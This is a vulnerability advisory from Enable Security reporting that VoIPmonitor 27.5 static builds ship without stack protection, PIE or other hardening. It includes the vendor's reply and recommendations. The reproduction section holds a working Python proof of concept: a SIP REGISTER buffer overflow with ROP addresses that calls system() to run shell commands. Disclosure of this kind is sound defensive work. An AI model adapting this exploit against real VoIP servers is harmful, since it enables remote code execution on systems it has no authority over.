# VoIPmonitor static builds are compiled without any standard memory corruption protection

- Fixed versions: N/A
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-04-voipmonitor-staticbuild-memory-corruption-protection
- VoIPmonitor Security Advisory: none
- Tested vulnerable versions: 27.5
- Timeline:
    - Report date: 2021-02-10 & 2021-02-13
	- Enable Security advisory: 2021-03-15

## Description

The binaries available for download at <https://www.voipmonitor.org/download> are built without any memory corruption protection in place. The following is output from the tool `hardening-check`:

```
hardening-check voipmonitor:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!
 Fortify Source functions: unknown, no protectable libc functions used
 Read-only relocations: no, not found!
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found
 Control flow integrity: unknown, no -fcf-protection instructions found!
```

When stack protection together with Fortify Source and other protection mechanisms are in place, exploitation of memory corruption vulnerabilities normally results in a program crash instead of leading to remote code execution. Most modern compilation systems create executable binaries with these features built-in by default. When these features are not used, attackers may easily exploit memory corruption vulnerabilities, such as buffer overflows, to run arbitrary code. In this advisory we will demonstrate how a buffer overflow reported in a separate advisory, could be abused to run arbitrary code because of the lack of standard memory corruption protection in the static build releases of VoIPmonitor.

The vendor has explained that:

> we are not going to enable the protection in the static builds as the speed is critical on many installations

> Our static build also uses tcmalloc (recommended version) which is required for high packet/second processing as the libc allocator is not fast enough especially on NUMA systems. For high packet/second traffic FORTIFY_SOURCE can introduce a lot of additional CPU cycles. If using custom builds with FORTIFY_SOURCE - they should compare if the sniffer did not introduced higher CPU usage.

While we understand the vendor's position, we are issuing an advisory to ensure that end users can make informed risk-based decisions.

## Impact

The lack of standard memory corruption protection mechanisms means that such vulnerabilities may lead to remote code execution.

## How to reproduce the issue

1. Execute the static build of VoIPmonitor (such as https://www.voipmonitor.org/current-stable-sniffer-static-64bit.tar.gz)
2. Start the live sniffer from the VOIPMonitor GUI or via the manager on port 5029
3. Execute the following Python program so that VOIPMonitor is able to capture the packet
4. Observe the payload being executed by the `voipmonitor` process, i.e. the following:
    - current user is printed due to execution of the `whoami` command
    - `h4x0r was here` is also printed
    - a file has been created in `/tmp/woot`

```python
import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

payload_size=32607
# Pad with As
payload = b'A' * 703
payload_size-=len(payload)

# Write system payload
cmd=b'whoami;echo "h4x0r was here";touch /tmp/woot\x00'
payload+=cmd
payload_size-=len(cmd)

# Pad some more so that we can overwrite the save_packet_sql's function return address
payload += b'A' * payload_size

# Call a ROP gadged that increments the value of the RDI register, 
# which will now point to the value set by cmd
payload += struct.pack('<Q', 0x0000000000b222f1)

# Return to system() to execute the value in RDI
payload += struct.pack('<Q', 0xb22fd0)

# Return to exit() to exit gracefully
payload += struct.pack('<Q', 0xf60a20)

msg=b'REGISTER %s SIP/2.0\r\n' % (payload)
msg+=b'Via: SIP/2.0/UDP 192.168.1.132:35393;rport;branch=z9hG4bK-kwtTkrdNAO2Wvw0v\r\n'
msg+=b'Max-Forwards: 70\r\n'
msg+=b'From: <sip:85861710@demo.sipvicious.pro>;tag=mnq1nKGNZHNUkNOG\r\n'
msg+=b'To: <sip:85861710@demo.sipvicious.pro>\r\n'
msg+=b'Call-ID: 93X9dNZO2qdcfpdu\r\n'
msg+=b'CSeq: 1 REGISTER\r\n'
msg+=b'Contact: <sip:85861710@192.168.1.132:35393;transport=udp>\r\n'
msg+=b'Expires: 60\r\n'
msg+=b'Content-Length: 0\r\n'
msg+=b'\r\n'
s.sendto(msg, ('167.71.58.84', 5060))

```

## Solution and recommendations

Users who would like to have standard memory corruption protection for VoIPmonitor should compile the binaries themselves and apply their own upgrades rather than using the upgrade feature from the VoIPmonitor GUI / sensors page.

We recommended the following to the vendor:

> Our recommendation is that standard memory corruption protection be switched on by default in the official binary build of VoIPmonitor. If there are specific requirements for specific systems that require such features to be switched off, then additional binaries should be offered, with adequate documentation of the risks involved.

> Do note that memory corruption vulnerabilities should also be addressed and fixed even if security features, such as Fortify, are used.

## Acknowledgements

Enable Security would like to thank Martin Vit and the developers at VoIPmonitor for the very quick responses and explanations with regards to this security issue.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

